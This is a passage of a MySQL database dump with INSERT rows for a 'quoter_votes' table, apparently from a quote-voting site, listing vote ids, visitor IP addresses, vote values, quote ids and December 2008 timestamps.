  (2832,'213.172.30.42','',0,79,1229084023),
  (2833,'212.14.162.147','',0,114,1229084303),
  (2834,'85.249.167.183','',0,78,1229084320),
  (2835,'80.80.111.200','',0,3,1229084467),
  (2836,'217.159.130.58','',0,69,1229084468),
  (2837,'217.159.130.58','',0,68,1229084490),
  (2838,'217.159.130.58','',0,67,1229084510),
  (2839,'193.93.218.64','',0,122,1229084530),
  (2840,'217.159.130.58','',0,66,1229084586),
  (2841,'217.159.130.58','',0,53,1229084634),
  (2842,'217.159.130.58','',0,42,1229084665),
  (2843,'217.159.130.58','',0,39,1229084675),
  (2844,'217.159.130.58','',0,38,1229084723),
  (2845,'217.159.130.58','',0,29,1229084750),
  (2846,'217.159.130.58','',0,26,1229084794),
  (2847,'217.159.130.58','',0,18,1229084839),
  (2848,'217.159.130.58','',0,17,1229085064),
  (2849,'85.90.197.122','',0,85,1229085068),
  (2850,'94.25.18.77','',0,119,1229085071),
  (2851,'91.122.84.182','',0,94,1229085112),
  (2852,'217.159.130.58','',0,13,1229085113),
  (2853,'217.159.130.58','',0,11,1229085130),
  (2854,'217.159.130.58','',0,10,1229085153),
  (2855,'193.232.92.242','',0,109,1229085161),
  (2856,'217.159.130.58','',0,9,1229085180),
  (2857,'193.232.92.242','',0,119,1229085184),
  (2858,'85.90.197.122','',0,116,1229085200),
  (2859,'193.232.92.242','',0,115,1229085203),
  (2860,'193.232.92.242','',0,113,1229085231),
  (2861,'217.159.130.58','',0,7,1229085250),
  (2862,'85.90.197.122','',0,111,1229085255),
  (2863,'85.90.197.122','',0,109,1229085271),
  (2864,'193.232.92.242','',0,122,1229085281),
  (2865,'193.232.92.242','',0,97,1229085329),
  (2866,'193.232.92.242','',0,96,1229085343),
  (2867,'193.232.92.242','',0,56,1229085360),
  (2868,'217.159.130.58','',0,6,1229085369),
  (2869,'94.25.18.77','',0,120,1229085377),
  (2870,'217.159.130.58','',0,4,1229085450),
  (2871,'217.159.130.58','',0,2,1229085456),
  (2872,'85.90.197.122','',0,120,1229085458),
  (2873,'217.159.130.58','',0,1,1229085466),
  (2874,'195.234.72.66','',0,119,1229085545),
  (2875,'89.209.252.12','',0,117,1229085622),
  (2876,'193.232.92.242','',0,79,1229085632),
  (2877,'193.232.92.242','',0,78,1229085659),
  (2878,'195.234.72.66','',0,61,1229085672),
  (2879,'94.25.18.77','',0,101,1229085694),
  (2880,'85.90.197.122','',0,67,1229085710),
  (2881,'91.196.63.171','',0,109,1229085742),
  (2882,'193.232.92.242','',0,101,1229085768),
  (2883,'94.25.18.77','',0,54,1229085969),
  (2884,'94.25.18.77','',0,115,1229085978),
  (2885,'195.184.70.254','',0,11,1229086561),
  (2886,'81.177.82.22','',0,55,1229086584),
  (2887,'66.249.66.47','',0,13,1229086590),
  (2888,'91.187.17.250','',0,116,1229086646),
  (2889,'91.187.17.250','',0,120,1229086672),
  (2890,'87.251.89.66','',0,67,1229086707),
  (2891,'87.251.89.66','',0,55,1229086722),
  (2892,'195.184.70.254','',0,42,1229086725),
  (2893,'87.251.89.66','',0,1,1229086727),
  (2894,'85.195.190.15','',0,78,1229086776),
  (2895,'195.184.70.254','',0,17,1229086847),
  (2896,'89.28.27.165','',0,12,1229087073),
  (2897,'145.64.134.224','',0,108,1229087130),
  (2898,'195.184.70.254','',0,20,1229087163),
  (2899,'91.208.153.1','',0,120,1229087231),
  (2900,'85.223.209.2','',0,124,1229087417),
  (2901,'92.101.28.129','',0,21,1229087479),
  (2902,'85.254.150.253','',0,101,1229087514),
  (2903,'85.223.209.2','',0,120,1229087532),
  (2904,'92.101.28.129','',0,24,1229087565),
  (2905,'193.239.216.162','',0,81,1229087594),
  (2906,'92.101.28.129','',0,22,1229087609),
  (2907,'193.239.216.162','',0,18,1229087610),
  (2908,'193.239.216.162','',0,67,1229087619),
  (2909,'193.239.216.162','',0,93,1229087630),
  (2910,'195.184.70.254','',0,6,1229087698),
  (2911,'62.203.86.89','',0,111,1229087739),
  (2912,'213.33.189.210','',0,115,1229087931),
  (2913,'213.33.189.210','',0,111,1229087988),
  (2914,'77.66.207.36','',0,19,1229088203),
  (2915,'195.184.70.254','',0,55,1229088395),
  (2916,'212.98.163.242','',0,109,1229088428),
  (2917,'91.192.86.30','',0,95,1229088441),
  (2918,'195.184.70.254','',0,93,1229088446),
  (2919,'82.116.203.21','',0,55,1229088467),
  (2920,'217.12.194.238','',0,101,1229088711),
  (2921,'77.73.50.178','',0,12,1229088840),
  (2922,'85.90.197.122','',0,107,1229088918),
  (2923,'85.90.197.122','',0,55,1229088940),
  (2924,'85.90.197.122','',0,1,1229088952),
  (2925,'85.90.197.122','',0,29,1229088966),
  (2926,'193.232.92.242','',0,61,1229088967),
  (2927,'77.73.50.178','',0,107,1229089241),
  (2928,'77.73.50.178','',0,95,1229089328),
  (2929,'77.73.50.178','',0,80,1229089390),
  (2930,'195.122.234.170','',0,115,1229089930),
  (2931,'79.142.22.254','',0,71,1229089934),
  (2932,'79.142.22.254','',0,76,1229089941),
  (2933,'85.113.134.18','',0,98,1229090035),
  (2934,'85.113.134.18','',0,95,1229090079),
  (2935,'85.113.134.18','',0,93,1229090119),
  (2936,'79.142.22.254','',0,21,1229090163),
  (2937,'212.248.25.26','',0,101,1229090187),
  (2938,'195.122.234.170','',0,56,1229090191),
  (2939,'212.248.25.26','',0,121,1229090195),
  (2940,'62.221.49.72','',0,119,1229090300),
  (2941,'85.113.134.18','',0,80,1229090394),
  (2942,'85.113.134.18','',0,53,1229090712),
  (2943,'195.26.92.114','',0,109,1229090740),
  (2944,'195.26.92.114','',0,107,1229090745),
  (2945,'195.26.92.114','',0,112,1229090745),
  (2946,'195.26.92.114','',0,114,1229090754),
  (2947,'91.202.197.79','',0,129,1229090815),
  (2948,'85.113.134.18','',0,26,1229090970),
  (2949,'192.88.166.35','',0,43,1229091012),
  (2950,'85.113.134.18','',0,17,1229091047),
  (2951,'212.106.39.94','',0,111,1229091156),
  (2952,'65.55.232.33','',0,122,1229091245),
  (2953,'87.252.248.9','',0,12,1229091270),
  (2954,'92.255.254.123','',0,12,1229091282),
  (2955,'94.25.18.77','',0,56,1229091544),
  (2956,'212.106.39.94','',0,131,1229091584),
  (2957,'85.113.134.18','',0,6,1229091611),
  (2958,'89.104.102.23','',0,52,1229091672),
  (2959,'89.104.102.23','',0,16,1229091770),
  (2960,'89.104.102.23','',0,43,1229091828),
  (2961,'194.88.211.254','',0,50,1229091855),
  (2962,'89.104.102.23','',0,19,1229091856),
  (2963,'89.104.102.23','',0,125,1229091874),
  (2964,'89.104.102.23','',0,99,1229091885),
  (2965,'85.113.134.18','',0,55,1229091885),
  (2966,'88.200.163.160','',0,87,1229091964),
  (2967,'65.55.232.33','',0,120,1229091995),
  (2968,'192.88.166.35','',0,125,1229092024),
  (2969,'192.88.166.35','',0,99,1229092027),
  (2970,'192.88.166.35','',0,62,1229092047),
  (2971,'212.106.39.94','',0,29,1229092155),
  (2972,'83.149.196.53','',0,107,1229092198),
  (2973,'89.110.32.98','',0,130,1229092278),
  (2974,'83.149.196.53','',0,99,1229092303),
  (2975,'62.221.47.59','',0,119,1229092325),
  (2976,'82.207.63.60','',0,55,1229092425),
  (2977,'62.221.47.59','',0,132,1229092451),
  (2978,'82.207.63.60','',0,132,1229092475),
  (2979,'91.202.197.79','',0,132,1229092494),
  (2980,'193.93.218.64','',0,132,1229092505),
  (2981,'83.149.196.53','',0,78,1229092528),
  (2982,'91.144.162.40','',0,95,1229092578),
  (2983,'91.144.162.40','',0,80,1229092706),
  (2984,'86.57.158.61','',0,18,1229092730),
  (2985,'212.98.163.238','',0,132,1229092830),
  (2986,'84.42.27.57','',0,90,1229092897),
  (2987,'91.144.162.40','',0,99,1229092898),
  (2988,'193.93.218.64','',0,124,1229093226),
  (2989,'91.202.197.79','',0,133,1229093239),
  (2990,'84.42.27.57','',0,56,1229093262),
  (2991,'193.34.76.95','',0,132,1229093312),
  (2992,'87.226.233.158','',0,12,1229093392),
  (2993,'84.42.27.57','',0,48,1229093412),
  (2994,'193.34.76.95','',0,120,1229093423),
  (2995,'89.104.102.23','',0,130,1229093478),
  (2996,'212.106.39.94','',0,125,1229093631),
  (2997,'81.18.116.69','',0,132,1229093638),
  (2998,'212.106.39.94','',0,132,1229093657),
  (2999,'94.178.203.154','',0,133,1229093740),
  (3000,'72.30.87.108','',0,57,1229093891);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 3000,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (3001,'82.144.212.86','',0,131,1229093974),
  (3002,'212.192.230.1','',0,21,1229093997),
  (3003,'94.27.9.18','',0,132,1229093997),
  (3004,'82.144.212.86','',0,120,1229094099),
  (3005,'94.178.203.154','',0,128,1229094302),
  (3006,'94.178.203.154','',0,124,1229094337),
  (3007,'193.93.218.64','',0,94,1229094500),
  (3008,'77.122.6.186','',0,115,1229094524),
  (3009,'195.46.35.25','',0,131,1229094552),
  (3010,'77.122.6.186','',0,109,1229094605),
  (3011,'213.27.29.6','',0,55,1229094605),
  (3012,'77.122.6.186','',0,107,1229094613),
  (3013,'195.46.35.25','',0,127,1229094647),
  (3014,'195.46.35.25','',0,126,1229094661),
  (3015,'80.68.6.181','',0,106,1229094683),
  (3016,'195.46.35.25','',0,133,1229094689),
  (3017,'193.33.93.41','',0,101,1229094745),
  (3018,'193.33.93.41','',0,90,1229094755),
  (3019,'193.33.93.41','',0,61,1229094782),
  (3020,'195.46.35.25','',0,54,1229094792),
  (3021,'80.80.111.200','',0,111,1229094846),
  (3022,'94.27.9.18','',0,95,1229094847),
  (3023,'80.68.6.181','',0,61,1229094935),
  (3024,'80.80.111.200','',0,66,1229094966),
  (3025,'84.204.148.130','',0,76,1229095019),
  (3026,'193.33.93.41','',0,93,1229095068),
  (3027,'78.37.152.125','',0,133,1229095182),
  (3028,'80.68.6.181','',0,3,1229095287),
  (3029,'94.51.159.70','',0,29,1229095323),
  (3030,'81.26.156.31','',0,133,1229095539),
  (3031,'77.123.40.165','',0,126,1229095695),
  (3032,'193.239.216.162','',0,29,1229095958),
  (3033,'78.138.136.208','',0,134,1229095995),
  (3034,'78.138.136.208','',0,133,1229096024),
  (3035,'194.140.237.226','',0,124,1229096033),
  (3036,'82.209.244.232','',0,58,1229096039),
  (3037,'194.140.237.226','',0,80,1229096189),
  (3038,'91.146.52.99','',0,55,1229096300),
  (3039,'78.138.136.208','',0,135,1229096320),
  (3040,'84.204.76.118','',0,135,1229096383),
  (3041,'84.204.76.118','',0,134,1229096419),
  (3042,'194.44.10.106','',0,94,1229096529),
  (3043,'213.27.29.6','',0,27,1229096820),
  (3044,'193.232.92.13','',0,101,1229096926),
  (3045,'93.85.24.164','',0,116,1229097183),
  (3046,'92.124.165.131','',0,53,1229097221),
  (3047,'193.232.92.13','',0,62,1229097370),
  (3048,'193.232.92.13','',0,56,1229097384),
  (3049,'92.124.165.131','',0,17,1229097442),
  (3050,'193.232.92.13','',0,42,1229097445),
  (3051,'93.85.24.164','',0,29,1229097627),
  (3052,'193.232.92.13','',0,18,1229097657),
  (3053,'86.57.246.94','',0,120,1229097832),
  (3054,'93.85.24.164','',0,3,1229097987),
  (3055,'86.57.246.94','',0,93,1229098037),
  (3056,'86.57.246.94','',0,39,1229098119),
  (3057,'86.57.246.94','',0,55,1229098142),
  (3058,'91.208.153.1','',0,109,1229098216),
  (3059,'86.57.246.94','',0,115,1229098289),
  (3060,'91.124.218.15','',0,29,1229098309),
  (3061,'86.57.246.94','',0,58,1229098626),
  (3062,'86.57.246.94','',0,135,1229098715),
  (3063,'91.202.197.79','',0,138,1229098803),
  (3064,'195.46.32.5','',0,124,1229098820),
  (3065,'77.122.109.16','',0,100,1229098820),
  (3066,'91.124.218.15','',0,1,1229098845),
  (3067,'195.46.32.5','',0,12,1229098998),
  (3068,'80.249.229.223','',0,133,1229099050),
  (3069,'91.192.86.30','',0,126,1229099137),
  (3070,'77.123.170.239','',0,1,1229099187),
  (3071,'195.46.33.5','',0,107,1229099199),
  (3072,'213.184.248.166','',0,120,1229099221),
  (3073,'212.92.177.238','',0,124,1229099306),
  (3074,'212.92.177.238','',0,120,1229099339),
  (3075,'77.123.170.239','',0,133,1229099395),
  (3076,'77.123.170.239','',0,111,1229099402),
  (3077,'212.92.177.238','',0,109,1229099405),
  (3078,'62.209.130.128','',0,126,1229099496),
  (3079,'91.192.86.30','',0,22,1229099513),
  (3080,'194.246.117.66','',0,110,1229099547),
  (3081,'91.124.218.15','',0,119,1229099635),
  (3082,'89.208.20.114','',0,130,1229099652),
  (3083,'89.208.20.114','',0,127,1229099672),
  (3084,'213.187.124.14','',0,124,1229099674),
  (3085,'89.208.20.114','',0,124,1229099694),
  (3086,'213.187.124.14','',0,116,1229099709),
  (3087,'89.208.20.114','',0,120,1229099714),
  (3088,'89.208.20.114','',0,119,1229099718),
  (3089,'213.187.124.14','',0,109,1229099796),
  (3090,'213.187.124.14','',0,107,1229099809),
  (3091,'195.160.234.3','',0,135,1229099831),
  (3092,'195.160.234.3','',0,136,1229099835),
  (3093,'89.208.20.114','',0,55,1229099838),
  (3094,'89.208.20.114','',0,1,1229099842),
  (3095,'195.160.234.3','',0,58,1229099845),
  (3096,'213.187.124.14','',0,105,1229099847),
  (3097,'89.208.20.114','',0,29,1229099849),
  (3098,'89.208.20.114','',0,18,1229099875),
  (3099,'195.160.234.3','',0,133,1229099923),
  (3100,'195.160.234.3','',0,119,1229099943),
  (3101,'91.124.218.15','',0,133,1229100004),
  (3102,'91.124.218.15','',0,139,1229100022),
  (3103,'195.160.234.3','',0,111,1229100058),
  (3104,'213.187.124.14','',0,98,1229100066),
  (3105,'195.160.234.3','',0,76,1229100106),
  (3106,'93.178.83.80','',0,111,1229100140),
  (3107,'93.178.83.80','',0,133,1229100141),
  (3108,'92.46.130.187','',0,139,1229100237),
  (3109,'91.202.197.79','',0,139,1229100404),
  (3110,'195.160.234.3','',0,139,1229100424),
  (3111,'213.187.124.14','',0,67,1229100557),
  (3112,'81.18.116.69','',0,140,1229100603),
  (3113,'91.202.197.79','',0,140,1229100659),
  (3114,'213.187.124.14','',0,53,1229100779),
  (3115,'213.184.248.166','',0,141,1229100819),
  (3116,'213.187.124.14','',0,38,1229100876),
  (3117,'213.187.124.14','',0,29,1229100903),
  (3118,'193.93.218.67','',0,140,1229100906),
  (3119,'213.187.124.14','',0,18,1229101280),
  (3120,'213.187.124.14','',0,10,1229101403),
  (3121,'213.187.124.14','',0,8,1229101448),
  (3122,'86.57.164.187','',0,95,1229101595),
  (3123,'91.124.218.15','',0,141,1229101626),
  (3124,'213.187.124.14','',0,6,1229101651),
  (3125,'91.124.218.15','',0,140,1229101655),
  (3126,'213.187.124.14','',0,2,1229101749),
  (3127,'213.187.124.14','',0,1,1229101772),
  (3128,'213.187.124.14','',0,56,1229101940),
  (3129,'204.10.79.217','',0,120,1229101940),
  (3130,'213.187.124.14','',0,141,1229102114),
  (3131,'78.107.252.177','',0,55,1229102119),
  (3132,'78.107.252.177','',0,1,1229102129),
  (3133,'213.187.124.14','',0,140,1229102130),
  (3134,'156.17.237.13','',0,141,1229102216),
  (3135,'156.17.237.13','',0,140,1229102282),
  (3136,'213.187.124.14','',0,21,1229102351),
  (3137,'213.187.124.14','',0,48,1229102408),
  (3138,'156.17.237.13','',0,133,1229102421),
  (3139,'90.151.128.117','',0,105,1229102468),
  (3140,'156.17.237.13','',0,124,1229102602),
  (3141,'156.17.237.13','',0,120,1229102656),
  (3142,'156.17.237.13','',0,119,1229102784),
  (3143,'156.17.237.13','',0,116,1229102857),
  (3144,'156.17.237.13','',0,107,1229103090),
  (3145,'85.175.59.61','',0,133,1229103105),
  (3146,'85.175.59.61','',0,126,1229103161),
  (3147,'156.17.237.13','',0,106,1229103161),
  (3148,'195.239.199.218','',0,119,1229103233),
  (3149,'92.244.226.97','',0,141,1229103240),
  (3150,'85.175.59.61','',0,114,1229103256),
  (3151,'156.17.237.13','',0,105,1229103266),
  (3152,'85.175.59.61','',0,111,1229103292),
  (3153,'195.239.199.218','',0,10,1229103332),
  (3154,'85.175.59.61','',0,98,1229103349),
  (3155,'156.17.237.13','',0,104,1229103361),
  (3156,'85.175.59.61','',0,94,1229103392),
  (3157,'85.175.59.61','',0,93,1229103409),
  (3158,'85.175.59.61','',0,70,1229103488),
  (3159,'85.175.101.10','',0,101,1229103599),
  (3160,'82.196.75.137','',0,119,1229104255),
  (3161,'82.196.75.137','',0,79,1229104270),
  (3162,'72.30.87.108','',0,53,1229104395),
  (3163,'78.37.24.166','',0,116,1229104620),
  (3164,'78.37.24.166','',0,107,1229104754),
  (3165,'78.107.255.52','',0,125,1229104949),
  (3166,'91.149.133.122','',0,141,1229104996),
  (3167,'91.149.133.122','',0,140,1229105018),
  (3168,'86.219.114.50','',0,98,1229105055),
  (3169,'91.149.133.122','',0,124,1229105087),
  (3170,'91.149.133.122','',0,116,1229105118),
  (3171,'89.41.120.17','',0,137,1229105119),
  (3172,'91.149.133.122','',0,114,1229105158),
  (3173,'91.149.133.122','',0,115,1229105164),
  (3174,'91.149.133.122','',0,109,1229105198),
  (3175,'94.253.17.84','',0,116,1229105325),
  (3176,'95.28.214.131','',0,120,1229105408),
  (3177,'95.28.214.131','',0,119,1229105420),
  (3178,'91.149.133.122','',0,105,1229105471),
  (3179,'82.196.75.137','',0,142,1229105473),
  (3180,'91.149.133.122','',0,104,1229105512),
  (3181,'91.149.133.122','',0,98,1229105550),
  (3182,'91.149.133.122','',0,103,1229105555),
  (3183,'91.149.133.122','',0,95,1229105573),
  (3184,'91.149.133.122','',0,93,1229105587),
  (3185,'91.149.133.122','',0,83,1229105617),
  (3186,'91.149.133.122','',0,80,1229105642),
  (3187,'91.149.133.122','',0,69,1229105661),
  (3188,'91.149.133.122','',0,67,1229105740),
  (3189,'91.149.133.122','',0,63,1229105837),
  (3190,'91.149.133.122','',0,39,1229105853),
  (3191,'91.149.133.122','',0,38,1229105926),
  (3192,'91.149.133.122','',0,29,1229105954),
  (3193,'91.149.133.122','',0,18,1229106001),
  (3194,'91.149.133.122','',0,20,1229106015),
  (3195,'91.149.133.122','',0,13,1229106036),
  (3196,'72.30.87.108','',0,119,1229106460),
  (3197,'92.62.146.114','',0,133,1229106935),
  (3198,'92.62.146.114','',0,131,1229107031),
  (3199,'77.126.56.60','',0,141,1229107125),
  (3200,'91.122.207.192','',0,142,1229107222),
  (3201,'77.126.56.60','',0,120,1229107273),
  (3202,'91.122.207.192','',0,119,1229107448),
  (3203,'93.125.69.217','',0,71,1229107786),
  (3204,'89.178.40.85','',0,117,1229107917),
  (3205,'93.125.69.217','',0,133,1229107971),
  (3206,'91.122.207.192','',0,16,1229107998),
  (3207,'193.27.209.200','',0,119,1229109735),
  (3208,'87.249.58.45','',0,116,1229109782),
  (3209,'82.144.197.20','',0,141,1229109813),
  (3210,'82.144.197.20','',0,140,1229109827),
  (3211,'82.144.197.20','',0,137,1229109857),
  (3212,'82.144.197.20','',0,124,1229109877),
  (3213,'82.144.197.20','',0,120,1229109901),
  (3214,'82.144.197.20','',0,116,1229109908),
  (3215,'82.144.197.20','',0,115,1229109920),
  (3216,'82.144.197.20','',0,114,1229109935),
  (3217,'82.144.197.20','',0,107,1229109950),
  (3218,'82.144.197.20','',0,109,1229109951),
  (3219,'78.37.55.216','',0,65,1229110159),
  (3220,'87.194.84.93','',0,116,1229110376),
  (3221,'80.93.115.10','',0,142,1229110393),
  (3222,'80.93.115.10','',0,141,1229110399),
  (3223,'81.24.213.13','',0,116,1229110499),
  (3224,'87.194.84.93','',0,109,1229110513),
  (3225,'81.24.213.13','',0,120,1229110514),
  (3226,'80.93.115.10','',0,139,1229110550),
  (3227,'85.30.194.89','',0,141,1229110579),
  (3228,'85.30.194.89','',0,140,1229110599),
  (3229,'92.112.183.103','',0,125,1229110681),
  (3230,'85.30.194.89','',0,131,1229110728),
  (3231,'85.30.194.89','',0,113,1229110757),
  (3232,'85.30.194.89','',0,88,1229110782),
  (3233,'78.36.21.231','',0,141,1229110902),
  (3234,'217.173.21.2','',0,101,1229111040),
  (3235,'217.173.21.2','',0,106,1229111067),
  (3236,'217.173.21.2','',0,61,1229111097),
  (3237,'92.112.183.103','',0,103,1229111215),
  (3238,'217.173.21.2','',0,111,1229111386),
  (3239,'95.67.130.232','',0,27,1229111523),
  (3240,'80.93.115.10','',0,116,1229112028),
  (3241,'80.93.115.10','',0,111,1229112204),
  (3242,'156.17.237.13','',0,133,1229112743),
  (3243,'89.151.179.154','',0,111,1229113017),
  (3244,'156.17.237.13','',0,142,1229113116),
  (3245,'80.93.115.10','',0,101,1229113215),
  (3246,'92.255.216.130','',0,131,1229113589),
  (3247,'66.249.66.47','',0,83,1229113614),
  (3248,'156.17.237.13','',0,3,1229113672),
  (3249,'77.232.129.72','',0,67,1229113755),
  (3250,'93.85.100.159','',0,143,1229114346),
  (3251,'93.85.100.159','',0,139,1229114487),
  (3252,'93.85.100.159','',0,137,1229114608),
  (3253,'93.85.100.159','',0,133,1229114745),
  (3254,'80.235.35.214','',0,141,1229114796),
  (3255,'93.85.100.159','',0,18,1229115087),
  (3256,'67.195.37.113','',0,135,1229115472),
  (3257,'67.195.37.113','',0,134,1229115636),
  (3258,'195.131.101.160','',0,48,1229115921),
  (3259,'67.195.37.113','',0,136,1229116199),
  (3260,'89.232.126.111','',0,134,1229116302),
  (3261,'89.232.126.111','',0,135,1229116303),
  (3262,'78.138.191.32','',0,55,1229117074),
  (3263,'82.209.232.174','',0,126,1229117151),
  (3264,'82.209.232.174','',0,62,1229117216),
  (3265,'80.93.115.10','',0,95,1229118576),
  (3266,'88.204.72.214','',0,61,1229118663),
  (3267,'65.55.232.33','',0,42,1229118726),
  (3268,'72.30.142.119','',0,14,1229118887),
  (3269,'80.93.115.10','',0,74,1229118916),
  (3270,'80.93.115.10','',0,72,1229118953),
  (3271,'80.93.115.10','',0,70,1229118995),
  (3272,'67.195.37.113','',0,138,1229119006),
  (3273,'80.93.115.10','',0,65,1229119222),
  (3274,'88.204.72.214','',0,127,1229119260),
  (3275,'88.204.72.214','',0,119,1229119275),
  (3276,'88.204.72.214','',0,56,1229119281),
  (3277,'80.93.115.10','',0,57,1229119355),
  (3278,'88.204.72.214','',0,55,1229119553),
  (3279,'88.204.72.214','',0,29,1229119584),
  (3280,'92.255.211.18','',0,140,1229119658),
  (3281,'80.93.115.10','',0,53,1229119720),
  (3282,'80.93.115.10','',0,46,1229119906),
  (3283,'80.93.115.10','',0,43,1229120021),
  (3284,'80.93.115.10','',0,61,1229120063),
  (3285,'80.93.115.10','',0,42,1229120189),
  (3286,'80.93.115.10','',0,39,1229120203),
  (3287,'67.195.37.113','',0,142,1229120225),
  (3288,'80.93.115.10','',0,29,1229120293),
  (3289,'194.158.194.187','',0,141,1229120476),
  (3290,'80.93.115.10','',0,24,1229120571),
  (3291,'78.36.204.246','',0,140,1229120593),
  (3292,'78.36.204.246','',0,55,1229120647),
  (3293,'78.36.204.246','',0,1,1229120710),
  (3294,'78.36.204.246','',0,29,1229120802),
  (3295,'78.36.204.246','',0,18,1229120915),
  (3296,'78.36.204.246','',0,67,1229120926),
  (3297,'92.255.211.18','',0,24,1229120941),
  (3298,'78.36.204.246','',0,93,1229120941),
  (3299,'78.36.204.246','',0,109,1229120958),
  (3300,'92.255.211.18','',0,23,1229120994),
  (3301,'92.255.211.18','',0,42,1229121061),
  (3302,'93.175.12.170','',0,140,1229121131),
  (3303,'93.175.12.170','',0,55,1229121201),
  (3304,'78.36.204.246','',0,141,1229121238),
  (3305,'93.175.12.170','',0,29,1229121238),
  (3306,'93.175.12.170','',0,56,1229121274),
  (3307,'93.175.12.170','',0,67,1229121284),
  (3308,'93.175.12.170','',0,119,1229121355),
  (3309,'80.93.115.10','',0,18,1229121471),
  (3310,'92.255.211.18','',0,55,1229121490),
  (3311,'92.255.211.18','',0,61,1229121567),
  (3312,'92.255.211.18','',0,74,1229121646),
  (3313,'80.93.115.10','',0,13,1229121653),
  (3314,'92.255.211.18','',0,83,1229121700),
  (3315,'67.195.37.113','',0,137,1229121784),
  (3316,'80.73.0.198','',0,101,1229121805),
  (3317,'67.195.37.113','',0,141,1229121834),
  (3318,'92.255.211.18','',0,93,1229121837),
  (3319,'92.255.211.18','',0,110,1229121890),
  (3320,'80.93.115.10','',0,10,1229121904),
  (3321,'92.255.211.18','',0,109,1229121910),
  (3322,'92.255.211.18','',0,107,1229121925),
  (3323,'212.115.225.26','',0,29,1229122099),
  (3324,'92.255.211.18','',0,120,1229122141),
  (3325,'80.93.115.10','',0,12,1229122242),
  (3326,'80.240.220.145','',0,141,1229122266),
  (3327,'80.240.220.145','',0,138,1229122288),
  (3328,'80.251.114.151','',0,94,1229122354),
  (3329,'80.93.115.10','',0,6,1229122382),
  (3330,'80.93.115.10','',0,2,1229122504),
  (3331,'80.251.114.151','',0,57,1229122511),
  (3332,'80.93.115.10','',0,1,1229122517),
  (3333,'80.240.220.145','',0,133,1229122601),
  (3334,'92.112.92.98','',0,140,1229122604),
  (3335,'92.112.92.98','',0,139,1229122621),
  (3336,'80.240.220.145','',0,109,1229122623),
  (3337,'92.112.92.98','',0,133,1229122702),
  (3338,'80.240.220.145','',0,107,1229122741),
  (3339,'80.240.220.145','',0,101,1229122782),
  (3340,'67.195.37.113','',0,143,1229122819),
  (3341,'94.25.61.245','',0,133,1229122940),
  (3342,'80.240.220.145','',0,120,1229123027),
  (3343,'92.112.213.187','',0,21,1229123093),
  (3344,'92.112.213.187','',0,29,1229123098),
  (3345,'92.112.213.187','',0,1,1229123104),
  (3346,'92.112.213.187','',0,55,1229123104),
  (3347,'92.112.213.187','',0,56,1229123135),
  (3348,'92.112.213.187','',0,93,1229123148),
  (3349,'213.79.105.42','',0,48,1229123226),
  (3350,'213.79.105.42','',0,21,1229123293),
  (3351,'80.73.0.198','',0,117,1229123341),
  (3352,'77.232.129.72','',0,17,1229123449),
  (3353,'77.232.129.72','',0,20,1229123462),
  (3354,'77.232.129.72','',0,11,1229123512),
  (3355,'66.249.66.47','',0,17,1229123521),
  (3356,'67.195.37.113','',0,134,1229123709),
  (3357,'91.185.53.201','',0,127,1229124003),
  (3358,'67.195.37.113','',0,136,1229124243),
  (3359,'89.222.209.22','',0,85,1229124459),
  (3360,'81.222.64.10','',0,1,1229124511),
  (3361,'81.222.64.10','',0,10,1229124513),
  (3362,'89.222.209.22','',0,24,1229124750),
  (3363,'89.222.209.22','',0,12,1229124805),
  (3364,'89.222.209.22','',0,55,1229124850),
  (3365,'89.222.209.22','',0,1,1229124884),
  (3366,'81.222.64.10','',0,100,1229124896),
  (3367,'89.222.209.22','',0,21,1229125018),
  (3368,'89.222.209.22','',0,93,1229125093),
  (3369,'81.222.64.10','',0,12,1229125125),
  (3370,'81.222.64.10','',0,14,1229125128),
  (3371,'81.222.64.10','',0,15,1229125338),
  (3372,'81.222.64.10','',0,16,1229125342),
  (3373,'89.222.209.22','',0,111,1229125380),
  (3374,'81.222.64.10','',0,18,1229125513),
  (3375,'81.222.64.10','',0,2,1229125680),
  (3376,'81.222.64.10','',0,21,1229125683),
  (3377,'81.222.64.10','',0,22,1229125815),
  (3378,'80.240.220.145','',0,111,1229125851),
  (3379,'81.222.64.10','',0,23,1229125917),
  (3380,'81.222.64.10','',0,24,1229125919),
  (3381,'80.92.96.12','',0,78,1229126032),
  (3382,'81.222.64.10','',0,27,1229126052),
  (3383,'81.222.64.10','',0,28,1229126057),
  (3384,'81.222.64.10','',0,29,1229126188),
  (3385,'81.222.64.10','',0,3,1229126292),
  (3386,'81.222.64.10','',0,30,1229126294),
  (3387,'81.222.64.10','',0,39,1229126418),
  (3388,'81.222.64.10','',0,4,1229126429),
  (3389,'81.222.64.10','',0,43,1229126878),
  (3390,'81.222.64.10','',0,44,1229126879),
  (3391,'81.222.64.10','',0,46,1229127048),
  (3392,'81.222.64.10','',0,47,1229127188),
  (3393,'81.222.64.10','',0,48,1229127192),
  (3394,'81.222.64.10','',0,49,1229127327),
  (3395,'85.91.111.226','',0,116,1229127416),
  (3396,'85.91.111.226','',0,120,1229127420),
  (3397,'81.222.64.10','',0,5,1229127436),
  (3398,'81.222.64.10','',0,50,1229127437),
  (3399,'88.75.143.167','',0,144,1229127568),
  (3400,'81.222.64.10','',0,54,1229127671),
  (3401,'81.222.64.10','',0,55,1229127776),
  (3402,'81.222.64.10','',0,56,1229127779),
  (3403,'81.222.64.10','',0,57,1229127885),
  (3404,'81.222.64.10','',0,58,1229127888),
  (3405,'81.222.64.10','',0,6,1229128002),
  (3406,'81.222.64.10','',0,60,1229128128),
  (3407,'81.222.64.10','',0,61,1229128133),
  (3408,'81.222.64.10','',0,62,1229128236),
  (3409,'81.222.64.10','',0,63,1229128350),
  (3410,'81.222.64.10','',0,65,1229128478),
  (3411,'81.222.64.10','',0,66,1229128479),
  (3412,'81.222.64.10','',0,67,1229128566),
  (3413,'81.222.64.10','',0,68,1229128676),
  (3414,'81.222.64.10','',0,69,1229128682),
  (3415,'81.222.64.10','',0,7,1229128687),
  (3416,'81.222.64.10','',0,70,1229128808),
  (3417,'81.222.64.10','',0,71,1229128887),
  (3418,'81.222.64.10','',0,72,1229128891),
  (3419,'81.222.64.10','',0,73,1229129015),
  (3420,'81.222.64.10','',0,74,1229129133),
  (3421,'81.222.64.10','',0,8,1229129135),
  (3422,'81.222.64.10','',0,85,1229129216),
  (3423,'81.222.64.10','',0,86,1229129225),
  (3424,'81.222.64.10','',0,87,1229129328),
  (3425,'81.222.64.10','',0,88,1229129439),
  (3426,'81.222.64.10','',0,89,1229129441),
  (3427,'81.222.64.10','',0,9,1229129523),
